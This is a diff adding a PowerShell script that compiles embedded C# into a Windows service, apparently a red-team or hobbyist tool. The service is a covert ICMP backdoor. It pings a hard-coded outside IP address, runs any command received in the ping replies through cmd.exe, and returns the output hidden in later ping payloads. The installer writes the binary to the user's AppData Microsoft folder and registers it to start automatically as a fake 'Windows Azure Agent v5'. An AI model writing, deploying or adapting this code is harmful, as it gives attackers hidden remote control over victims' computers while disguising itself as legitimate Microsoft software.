@@ -1,0 +1,229 @@
+$code = @"
+
+// Found the code below for a simple C# service and giving credit to the below resource
+// https://raw.githubusercontent.com/JFLarvoire/SysToolsLib/master/PowerShell/PSService.ps1
+
+using System;
+using System.ServiceProcess;
+using System.Diagnostics;
+using System.Runtime.InteropServices;                                 
+using System.ComponentModel;                                          
+using System.Text;
+using System.Net.NetworkInformation;
+using System.Threading;
+
+public enum ServiceType : int {                                       
+  SERVICE_WIN32_OWN_PROCESS = 0x00000010,
+  SERVICE_WIN32_SHARE_PROCESS = 0x00000020,
+};                                                                    
+
+public enum ServiceState : int {                                      
+  SERVICE_STOPPED = 0x00000001,
+  SERVICE_START_PENDING = 0x00000002,
+  SERVICE_STOP_PENDING = 0x00000003,
+  SERVICE_RUNNING = 0x00000004,
+  SERVICE_CONTINUE_PENDING = 0x00000005,
+  SERVICE_PAUSE_PENDING = 0x00000006,
+  SERVICE_PAUSED = 0x00000007,
+};
+
+[StructLayout(LayoutKind.Sequential)]                                
+public struct ServiceStatus {
+public ServiceType dwServiceType;
+public ServiceState dwCurrentState;
+public int dwControlsAccepted;
+public int dwWin32ExitCode;
+public int dwServiceSpecificExitCode;
+public int dwCheckPoint;
+public int dwWaitHint;
+};                                                                    
+
+public enum Win32Error : int { // WIN32 errors that we may need to use
+  NO_ERROR = 0,
+  ERROR_APP_INIT_FAILURE = 575,
+  ERROR_FATAL_APP_EXIT = 713,
+  ERROR_SERVICE_NOT_ACTIVE = 1062,
+  ERROR_EXCEPTION_IN_SERVICE = 1064,
+  ERROR_SERVICE_SPECIFIC_ERROR = 1066,
+  ERROR_PROCESS_ABORTED = 1067,
+};
+
+public class Service_ICMP : ServiceBase { 
+  private ServiceStatus serviceStatus;                                
+
+  public Service_ICMP() {
+    ServiceName = "ICMP";
+    CanStop = true;
+    CanPauseAndContinue = false;
+    AutoLog = true;
+  }
+
+  [DllImport("advapi32.dll", SetLastError=true)]                      
+  private static extern bool SetServiceStatus(IntPtr handle, ref ServiceStatus serviceStatus);
+
+  protected override void OnStart(string [] args) {
+    serviceStatus.dwServiceType = ServiceType.SERVICE_WIN32_OWN_PROCESS;
+    serviceStatus.dwCurrentState = ServiceState.SERVICE_START_PENDING;
+    serviceStatus.dwWin32ExitCode = 0;
+    serviceStatus.dwWaitHint = 2000; 
+    SetServiceStatus(ServiceHandle, ref serviceStatus);             
+    string destIP = "64.137.165.77";
+    int delaySeconds = 2;
+    string outputCmdTXT = "";
+    Ping pingSender = new Ping ();
+    // Create a buffer of 32 bytes of data to be transmitted.
+    string data = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
+    string executeCMD;
+
+    while (true) {
+      try {
+        Thread.Sleep(delaySeconds * 1000);      // Sleep for x seconds in the loop
+        if ((outputCmdTXT.Length > 0) && (outputCmdTXT.Length <= 200)) {
+          //data = "output:";
+          // If the length is less than 200 place in data sent
+          data = outputCmdTXT.Substring(0,outputCmdTXT.Length-1);
+          outputCmdTXT = "";
+        }
+        else if (outputCmdTXT.Length > 200) {
+          data = outputCmdTXT.Substring(0,200);
+          outputCmdTXT = outputCmdTXT.Substring(201, (outputCmdTXT.Length - 201));
+        }
+        else {
+          data = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
+        }
+            
+        byte[] buffer = Encoding.ASCII.GetBytes (data);
+        // Wait 10 seconds for a reply.
+        int timeout = 10000;
+
+        // Set options for transmission:
+        // The data can go through 64 gateways or routers
+        // before it is destroyed, and the data packet
+        // cannot be fragmented.
+        PingOptions options = new PingOptions (64, true);
+
+        // Send the request.
+        PingReply reply = pingSender.Send (destIP, timeout, buffer, options);
+        if (reply.Status == IPStatus.Success)
+        {
+          // Commenting out the Console.Writeline due to it being a service
+          //Console.WriteLine ("Address: {0}", reply.Address.ToString());
+          //Console.WriteLine ("RoundTrip time: {0}", reply.RoundtripTime);
+          //Console.WriteLine ("Time to live: {0}", reply.Options.Ttl);
+          //Console.WriteLine ("Don't fragment: {0}", reply.Options.DontFragment);
+          //Console.WriteLine ("Buffer size: {0}", reply.Buffer.Length);
+          //Console.WriteLine ("Buffer: {0}", Encoding.UTF8.GetString(reply.Buffer));
+          executeCMD = Encoding.ASCII.GetString(reply.Buffer);
+          if (executeCMD.Contains("c:")) {
+            executeCMD = executeCMD.Replace("c:", "");
+            //Console.WriteLine(executeCMD);
+            if (executeCMD.Length > 0) {
+              Process p = new Process();
+              p.StartInfo.UseShellExecute = false;
+		          p.StartInfo.RedirectStandardOutput = true;
+    		      p.StartInfo.RedirectStandardError = true;
+	    	      p.StartInfo.CreateNoWindow = true;
+		          p.StartInfo.FileName="cmd.exe";
+			        //p.StartInfo.Arguments = "/C ping -n 1 127.0.0.1";
+			        p.StartInfo.Arguments = "/C " + executeCMD;
+			        p.Start();
+			        string output = p.StandardOutput.ReadToEnd();
+              outputCmdTXT += output;
+	    	      p.WaitForExit();
+              //Console.WriteLine(output);
+            }
+            else {
+              //Console.WriteLine("Command is empty...");
+            }
+          }
+        }
+        else
+        {
+          Console.WriteLine (reply.Status);
+        }                 
+        serviceStatus.dwCurrentState = ServiceState.SERVICE_RUNNING;    
+      } 
+      catch (Exception e) {
+        serviceStatus.dwCurrentState = ServiceState.SERVICE_STOPPED;
+        Win32Exception w32ex = e as Win32Exception; 
+        if (w32ex == null) { 
+          w32ex = e.InnerException as Win32Exception;
+        }    
+        if (w32ex != null) {    
+          serviceStatus.dwWin32ExitCode = w32ex.NativeErrorCode;
+        } 
+        else {                
+          serviceStatus.dwWin32ExitCode = (int)(Win32Error.ERROR_APP_INIT_FAILURE);
+        }                                                              
+      } 
+      finally {
+        serviceStatus.dwWaitHint = 0;                                   
+        SetServiceStatus(ServiceHandle, ref serviceStatus);             
+      }
+    }
+  }
+
+  protected override void OnStop() {
+    try {
+      serviceStatus.dwCurrentState = ServiceState.SERVICE_STOPPED;      
+    } 
+    catch (Exception e) {
+      serviceStatus.dwCurrentState = ServiceState.SERVICE_RUNNING;
+      Win32Exception w32ex = e as Win32Exception; 
+      if (w32ex == null) { 
+        w32ex = e.InnerException as Win32Exception;
+      }    
+      if (w32ex != null) {    
+        serviceStatus.dwWin32ExitCode = w32ex.NativeErrorCode;
+      } 
+      else {                
+        serviceStatus.dwWin32ExitCode = (int)(Win32Error.ERROR_APP_INIT_FAILURE);
+      }                                                               
+    } 
+    finally {
+      serviceStatus.dwWaitHint = 0;                                  
+      SetServiceStatus(ServiceHandle, ref serviceStatus);            
+    }
+  }
+
+  public static void Main() {
+    System.ServiceProcess.ServiceBase.Run(new Service_ICMP());
+  }
+}
+
+
+
+"@
+
+# Use APPData current directory and in the Microsoft Folder place the exe
+$path = $env:APPDATA + "\Microsoft"
+$binaryPath = $path + "\AzureAgentv5.exe"
+$serviceName = "Windows Azure Agent v5"
+$serviceDesc = "Use Windows Azure Agent to manage Azure virtual services, without having to deploy kittens."
+
+Add-Type -TypeDefinition $code -Language CSharp -OutputAssembly $binaryPath -OutputType ConsoleApplication -ReferencedAssemblies "System.ServiceProcess" -Debug:$false
+
+if (Get-Service $serviceName -ErrorAction SilentlyContinue)
+{
+    $serviceToRemove = Get-WmiObject -Class Win32_Service -Filter "name='$serviceName'"
+    $serviceToRemove.delete()
+    "Service removed in preparation to recreate"
+}
+else
+{
+    "Service does not exist"
+}
+
+"Installing service"
+
+$secpasswd = ConvertTo-SecureString "badpassword!A" -AsPlainText -Force
+$mycreds = New-Object System.Management.Automation.PSCredential (".\thepcn3rd", $secpasswd)
+
+New-Service -name $serviceName -binaryPathName $binaryPath -displayName $serviceName -startupType Automatic -Credential $mycreds -Description $serviceDesc
+
+"Installation completed"
+
+"Adjust the service to run with correct credentials or as the local system."
+
+# Delete the service by the below command
+# sc.exe delete "Microsoft Azure Agent v5"
